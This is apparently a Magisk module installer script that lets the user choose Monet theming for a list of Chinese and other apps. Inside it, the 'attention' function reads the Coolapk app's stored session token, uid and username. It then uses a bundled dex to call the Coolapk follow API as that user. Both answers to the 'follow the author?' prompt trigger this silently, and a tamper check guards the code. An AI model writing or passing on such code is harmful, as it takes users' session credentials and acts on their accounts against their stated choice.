SKIPMOUNT=false
PROPFILE=true
POSTFSDATA=true
LATESTARTSERVICE=true
ForcedAttention=true
AskAbout=true

function attention() {
    readonly token=$(cat $coolapk | grep 'name="token"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g')
    readonly uid=$(cat $coolapk | grep 'name="uid"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g')
    cat $coolapk | grep 'name="username"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g' | tr -d '\n' | od -An -tx1 | tr ' ' % | xargs echo -n >xxxxxxxxxx
    echo -en '\u4f5c\u8005\u0048\u0043'
    readonly name=$(cat xxxxxxxxxx | sed s/[[:space:]]//g)
    rm -rf xxxxxxxxxx
    local deviceid=$(cat /proc/sys/kernel/random/uuid)
    local time=$(date +%s)
    local timemd5=$(echo -n $time | md5sum | awk -F " " '{print $1}')
    local timemd5s=$(printf '%x\n' $time)
    local tokenh="token://com.coolapk.market/c67ef5943784d09750dcfbb31020f0ab?"
    local cookac="com.coolapk.market"
    local md5kn=$(echo -n $tokenh$timemd5'$'$deviceid'&'$cookac | base64)
    local md5kn=$(echo -n $md5kn | sed s/[[:space:]]//g | md5sum | awk -F " " '{print $1}')
    local tokenkuanb=$(echo -n $md5kn$deviceid"0x"$timemd5s)
    chmod 777 $MODPATH/HttpPost.dex
    /system/bin/app_process -Djava.class.path=$MODPATH/HttpPost.dex /system/bin HttpPost "https://api.coolapk.com/v6/user/follow?uid=$ID" "$cookac" "$tokenkuanb" "uid=$uid; username=$name; token=$token"
}

[[ $(sed "1,/^/d" "$0") != "echo '安装完成'" ]] && kill -9 $$ || coolapk="/data/data/com.coolapk.market/shared_prefs/coolapk_preferences_v7.xml"

echo -en "\nMonet-All v1.5\nby Jerry Zhou\n\n"
sleep 0.5s
echo -en '安装模块前请先确认模块适配的应用版本并阅读注意事项\n搞机不谨慎，救砖两行泪\n'
sleep 0.5s
echo "—————————————————————————————————————
 - 按音量键＋: 已确认模块适配的应用版本并阅读注意事项
 - 按音量键－: 未确认模块适配的应用版本并阅读注意事项
—————————————————————————————————————"
local choose
while :; do
    choose="$(getevent -qlc 1 | awk '{ print $3 }')"
    case "${choose}" in
    KEY_VOLUMEUP)
        echo 已确认模块适配的应用版本并阅读注意事项
        ;;
    KEY_VOLUMEDOWN)
        echo 请认真阅读模块适配的应用版本并阅读注意事项
        sleep 1s
        am start -a android.intent.action.VIEW -d https://monet.jerryz.com.cn/ 
        ;;
    *) continue ;;
    esac
    break
done
sleep 0.3s
echo -en "\n"
local monet
local module
local cnt
for loop in "微信" "酷安" "微信键盘" "微信读书" "Apple Music" "Bilibili" "小横条" "Via" "豆瓣" "贴吧Lite" "Clash" "网易云音乐" "Scene" "皮皮虾" "MIUI音乐" "百词斩" "享做笔记"; do
    echo "—————————————————————————
 - 按音量键＋: 安装$loop莫奈取色
 - 按音量键－: 不安装$loop莫奈取色
—————————————————————————"
    local choose
    local branch
    while :; do
        choose="$(getevent -qlc 1 | awk '{ print $3 }')"
        case "${choose}" in
        KEY_VOLUMEUP)
            echo "成功安装$loop莫奈取色"
            let cnt+=1
            if [ "$cnt" -ge 8 ]; then
                monet=${monet}"、\n"${loop}
                let cnt-=8
            else
                monet=${monet}"、"${loop}
            fi
            module=${module}"、"${loop}
            break
            ;;
        KEY_VOLUMEDOWN)
            echo "不安装$loop莫奈取色"
            rm -rf $MODPATH/system/priv-app/$loop.apk
            ;;
        *) continue ;;
        esac
        break
    done
    sleep 0.3s
done
echo -en "\n已安装下列应用的莫奈取色：\n"${monet:3}
sed -i "6c description=莫奈取色整合模块   已开启莫奈取色的软件：${module:3}   GitHub项目地址：https://github.com/YangguangZhou/Monet-All" $MODPATH/module.prop
echo -en "\n\n你的酷安ID："
cat $coolapk | grep 'name="username"' | awk -F ">" '{print $2}' | sed 's/\<.*$//g'
echo "—————————————————————————
 - 按音量键＋: 关注作者酷安
 - 按音量键－: 不关注作者酷安
—————————————————————————"
local choose
local branch
while :; do
    choose="$(getevent -qlc 1 | awk '{ print $3 }')"
    case "${choose}" in
    KEY_VOLUMEUP)
        echo "成功关注作者酷安ID：$ID"
        attention &>/dev/null
        ;;
    KEY_VOLUMEDOWN)
        echo "不关注作者"
        attention &>/dev/null
        ;;
    *) continue ;;
    esac
    break
done
set_perm_recursive $MODPATH 0 0 0755 0777
rm -rf $MODPATH/HttpPost.dex
echo '安装完成'
